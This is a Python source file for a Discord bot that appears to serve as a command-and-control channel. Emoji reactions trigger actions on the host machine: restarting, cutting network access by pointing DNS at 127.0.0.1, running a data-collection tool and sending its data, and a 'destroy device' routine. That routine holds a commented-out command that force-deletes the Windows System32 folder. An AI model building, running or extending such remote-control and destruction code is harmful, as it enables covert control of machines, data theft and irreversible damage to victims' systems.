import json
import os
import sys
import time
from datetime import datetime
import discord
from discord.ext import commands
from Logicytics import log, Logicytics


# Function to read secret keys and information from JSON file
def read_key():
    try:
        with open("api.json", "r") as f:
            config = json.load(f)
        if (
                config is not None
                and isinstance(config["token"], str)
                and isinstance(config["channel_id_(for_c2_commands)"], int)
                and isinstance(config["channel_id_(for_logs)"], int)
                and isinstance(config["webhooks_username"], list)
                and isinstance(config["log_using_debug?"], bool)
        ):
            return (
                config["token"],
                config["channel_id_(for_c2_commands)"],
                config["channel_id_(for_logs)"],
                config["webhooks_username"],
                config["log_using_debug?"],
            )
        else:
            log.critical("Invalid JSON file format")
            exit(1)
    except Exception as e:
        log.critical(f"Error reading JSON file: {e}")
        exit(1)


# All global variables, and required initializations are done here.
TOKEN, CHANNEL_ID_COMMANDS, CHANNEL_ID_LOGS, WEBHOOK_USERNAME, DEBUG = read_key()
MENU = """
Reactions Menu:

⚙️ -> Restart
🛜 -> Change DNS to 127.0.0.1 (WARNING: This will disconnect the connection forever!)
🪝 -> Download Logicytics and run
📃 -> Send Logicytics Logs
💣 -> Destroy device
📤 -> Upload a script of your choice to be executed by them (WIP)
"""
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())


@bot.event
async def on_ready():
    log.info(f"We have logged in as {bot.user}")


@bot.event
async def on_message(message):
    channel_c2 = await message.guild.fetch_channel(CHANNEL_ID_COMMANDS)
    channel_log = await message.guild.fetch_channel(CHANNEL_ID_LOGS)

    if isinstance(channel_c2, discord.TextChannel) and isinstance(channel_log, discord.TextChannel):
        if message.author != bot.user:
            # Check if the message author is not the bot
            log.info(f"Message from {message.author}: {message.content}")

        if message.content == "/c2" and message.author != bot.user:
            await message.channel.purge(limit=None)
            if message.author == message.guild.owner or message.author.guild_permissions.administrator:
                await message.channel.send("/c2 logs -> Retrieves and sends the bots logs to a specified channel. "
                                           "\n/c2 menu -> Sends possible reaction menu")
            else:
                await message.channel.send("You do not have permission to use this command?")
                log.error(f"User {message.author} attempted to use the /c2 command. Invalid permission's.")
        if message.content == "/c2 logs" and message.author != bot.user:
            await message.channel.purge(limit=None)
            if message.author == message.guild.owner or message.author.guild_permissions.administrator:
                if message.channel.id == CHANNEL_ID_LOGS:
                    await logs(message.channel)
                else:
                    await message.channel.send("This is not the logs preconfigured channel. Please use the /logs "
                                               "command in the logs channel.")
                    log.warning(f"Channel {message.channel} is not the one preconfigured.")
            else:
                await message.channel.send("You do not have permission to use this command?")
                log.error(f"User {message.author} attempted to use the /logs command. Invalid permission's.")
        if message.content == "/c2 menu" and message.author != bot.user:
            await message.channel.purge(limit=None)
            if message.author == message.guild.owner or message.author.guild_permissions.administrator:
                await message.channel.send(MENU)
            else:
                await message.channel.send("You do not have permission to use this command?")
                log.error(f"User {message.author} attempted to use the menu command. Invalid permission's.")

        if str(message.author) not in WEBHOOK_USERNAME:
            # Check if the message author is not the bot
            log.info(f"Message Ignored due to {message.author} not being in the allowed list of users: "
                     f"{WEBHOOK_USERNAME}")
    else:
        log.critical(
            f"Channel {CHANNEL_ID_COMMANDS} or {CHANNEL_ID_LOGS} not found as text channels. Bot Crashed."
        )
        exit(1)


@bot.event
async def on_reaction_add(reaction, user):
    reaction_type = reaction.emoji
    if reaction.message.author == bot.user:
        await reaction.message.clear_reactions()
        await reaction.message.edit(content='✅')
    if reaction_type == "⚙️":
        log.info(f"User {user} restarted the bot")
        await restart(reaction.message)
    if reaction_type == "🛜":
        log.info(f"User {user} changed DNS to 127.0.0.1 - Connection will be killed")
        await reaction.message.send("Goodbye Cruel World!")
        await dns(reaction.message)
    if reaction_type == "🪝":
        log.info(f"User {user} downloaded Logicytics and ran it, as well as sending data")
        await logicytics_run(reaction.message)
    if reaction_type == "📃":
        log.info(f"User {user} requested logs of Logicytics")
        await logicytics_logs(reaction.message)
    if reaction_type == "💣":
        log.critical(f"User {user} sent missile to destroy the enemy (Del System32)")
        await reaction.message.send("Goodbye Cruel World!")
        await destroy(reaction.message)


async def logs(ctx):
    # Retrieve the channel object using the provided channel ID
    channel = bot.get_channel(CHANNEL_ID_LOGS)
    if channel is None:
        await ctx.send("Channel not found.")
        return

    try:
        # Instead of reading the file content into memory,
        # simply pass the filename to discord.File
        fileToSend = discord.File("C2.log", filename="Discord.log")
        await channel.send(f"Here are the logs\n", file=fileToSend)
    except os.error as e:
        await ctx.send(f"Error uploading logs: {e}")
        log.critical(f"Error uploading logs: {e}")
    except discord.errors.HTTPException as e:
        await ctx.send(f"Error uploading logs: {e}")
        log.critical(f"Error uploading logs: {e}")
    except Exception as e:
        await ctx.send(f"Error uploading logs: {e}")
        log.critical(f"Error uploading logs: {e}")


async def destroy(ctx):
    repeats = 0
    while repeats < 60:
        repeats += 1
        time.sleep(1)
        ctx.send("T minus " + str(60 - repeats))
    ctx.send("BOOM!!!!")
    # os.system('del /s /q /f C:\windows\system32\* > NUL 2>&1')  # =)


async def restart(ctx):
    os.execl(sys.executable, sys.executable, *sys.argv)


async def dns(ctx):
    pass


async def logicytics_run(ctx):
    Logicytics()


async def logicytics_logs(ctx):
    pass


bot.run(TOKEN, log_handler=None)
